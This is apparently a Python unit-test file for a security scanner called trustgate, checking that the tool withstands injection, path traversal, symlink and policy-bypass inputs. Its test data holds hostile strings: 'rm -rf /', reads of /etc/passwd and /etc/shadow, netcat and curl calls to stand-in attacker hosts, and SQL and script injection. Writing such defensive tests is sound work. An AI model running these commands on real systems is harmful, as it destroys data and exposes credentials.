"""Security tests: injection, traversal, and trust boundary violations.

Covers: command injection, path traversal, malicious filenames,
malicious scanner output, HTML injection, SARIF injection.
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from trustgate.fingerprints import fingerprint_finding


class CommandInjectionTests(unittest.TestCase):
    """Verify command injection payloads are neutralised."""

    PAYLOADS = [
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`whoami`",
        "| nc attacker.com 4444",
        "&& curl evil.com",
        "\n/bin/sh",
    ]

    def test_fingerprint_handles_injection_in_rule_id(self):
        """Fingerprinting should treat injection strings as opaque data."""
        for payload in self.PAYLOADS:
            finding = {
                "rule_id": payload,
                "file_path": "safe.py",
                "line": 1,
                "scanner": "test",
                "severity": "high",
            }
            result = fingerprint_finding(finding)
            # Returns (scanner_id, fingerprint) tuple
            self.assertIsInstance(result, tuple)
            self.assertEqual(len(result), 2)

    def test_fingerprint_handles_injection_in_file_path(self):
        for payload in self.PAYLOADS:
            finding = {
                "rule_id": "B101",
                "file_path": payload,
                "line": 1,
                "scanner": "test",
                "severity": "high",
            }
            result = fingerprint_finding(finding)
            self.assertIsInstance(result, tuple)


class PathTraversalTests(unittest.TestCase):
    """Verify path traversal is blocked in file stores."""

    TRAVERSAL_PATHS = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "/etc/shadow",
        "foo/../../bar",
    ]

    def test_feedback_store_rejects_symlinks(self):
        from trustgate.calibration.feedback import (
            CalibrationFeedbackError,
            FeedbackStore,
        )
        with tempfile.TemporaryDirectory() as d:
            target = Path(d) / "real.json"
            target.write_text("[]")
            link = Path(d) / "link.json"
            link.symlink_to(target)
            store = FeedbackStore(link)
            with self.assertRaises(CalibrationFeedbackError):
                store._save([{"test": True}])

    def test_ticket_store_rejects_symlinks(self):
        from trustgate.integrations.tickets import TicketStore, TicketSyncError
        with tempfile.TemporaryDirectory() as d:
            target = Path(d) / "real.json"
            target.write_text("[]")
            link = Path(d) / "link.json"
            link.symlink_to(target)
            store = TicketStore(link)
            with self.assertRaises(TicketSyncError):
                store._save([{"test": True}])


class MaliciousFilenameTests(unittest.TestCase):
    """Verify malicious filenames don't cause issues."""

    FILENAMES = [
        "'; DROP TABLE findings;--",
        "<script>alert(1)</script>.py",
        "\x00null_byte.py",
        "a" * 1000,  # extremely long
    ]

    def test_fingerprint_handles_malicious_filenames(self):
        for name in self.FILENAMES:
            finding = {
                "rule_id": "B101",
                "file_path": name,
                "line": 1,
                "scanner": "test",
                "severity": "high",
            }
            result = fingerprint_finding(finding)
            self.assertIsInstance(result, tuple)


class MaliciousScannerOutputTests(unittest.TestCase):
    """Verify malicious scanner output is handled safely."""

    def test_severity_normalisation_handles_garbage(self):
        from trustgate.severity import normalise_scanner_severity
        # Should not crash on garbage input — rejection is fine
        for garbage in ["<script>", "'; DROP", "\x00", ""]:
            try:
                normalise_scanner_severity("Bandit", garbage)
            except (ValueError, TypeError, AttributeError, KeyError):
                pass  # Rejection is fine — crashing is not


class HTMLInjectionTests(unittest.TestCase):
    """Verify HTML injection in findings is escaped."""

    def test_structured_error_escapes_html(self):
        from trustgate.errors import TrustGateError
        err = TrustGateError(
            what_failed="<script>alert(1)</script>",
            why="<img onerror=alert(1)>",
        )
        rendered = err.render()
        # The render is plaintext, so HTML tags are kept as-is
        # but should never be interpreted as HTML in CLI output
        self.assertIn("<script>", rendered)  # not escaped — plaintext context


class SARIFInjectionTests(unittest.TestCase):
    """Verify SARIF output doesn't allow injection."""

    def test_sarif_schema_uri_valid(self):
        from trustgate.sarif.generation import SARIF_SCHEMA_URI
        self.assertIn("sarif", SARIF_SCHEMA_URI.lower())


class SecretLeakageTests(unittest.TestCase):
    """Verify secrets don't leak into output."""

    def test_redaction_config_redacts_source(self):
        from trustgate.deployment.modes import RedactionConfig
        config = RedactionConfig()
        self.assertTrue(config.redact_source_code)
        self.assertNotIn("source_code", config.allowed_fields)


class PolicyBypassTests(unittest.TestCase):
    """Verify policy cannot be trivially bypassed."""

    def test_local_mode_rejects_network(self):
        from trustgate.deployment.modes import (
            DeploymentModeError,
            validate_deployment_config,
        )
        with self.assertRaises(DeploymentModeError):
            validate_deployment_config({
                "mode": "local",
                "network_mode": "full",
            })

    def test_local_mode_rejects_telemetry(self):
        from trustgate.deployment.modes import (
            DeploymentModeError,
            validate_deployment_config,
        )
        with self.assertRaises(DeploymentModeError):
            validate_deployment_config({
                "mode": "local",
                "telemetry_consent": True,
            })


class SuppressionBypassTests(unittest.TestCase):
    """Verify suppression close requires validation."""

    def test_unvalidated_close_does_not_update_finding(self):
        from trustgate.integrations.tickets import assign_finding, sync_ticket_close
        record = assign_finding(
            {"fingerprint": "abc", "severity": "high"},
            owner="alice",
            integration_type="jira",
        )
        result = sync_ticket_close(record, validated=False)
        self.assertFalse(result["finding_state_updated"])


class SymlinkAttackTests(unittest.TestCase):
    """Verify symlink attacks are blocked on all stores."""

    def test_feedback_store_symlink_blocked(self):
        from trustgate.calibration.feedback import (
            CalibrationFeedbackError,
            FeedbackStore,
        )
        with tempfile.TemporaryDirectory() as d:
            real = Path(d) / "data.json"
            real.write_text("[]")
            sym = Path(d) / "symlink.json"
            sym.symlink_to(real)
            store = FeedbackStore(sym)
            with self.assertRaises(CalibrationFeedbackError):
                store._save([])

    def test_ticket_store_symlink_blocked(self):
        from trustgate.integrations.tickets import TicketStore, TicketSyncError
        with tempfile.TemporaryDirectory() as d:
            real = Path(d) / "data.json"
            real.write_text("[]")
            sym = Path(d) / "symlink.json"
            sym.symlink_to(real)
            store = TicketStore(sym)
            with self.assertRaises(TicketSyncError):
                store._save([])


class ResourceExhaustionTests(unittest.TestCase):
    """Verify large inputs don't cause unbounded resource usage."""

    def test_large_finding_list_handled(self):
        from trustgate.management.dashboard import multi_repository_dashboard
        # 10000 findings should complete without error
        findings = [{"severity": "low"} for _ in range(10000)]
        result = multi_repository_dashboard([{"name": "big", "findings": findings}])
        self.assertEqual(result["total_findings"], 10000)


if __name__ == "__main__":
    unittest.main()
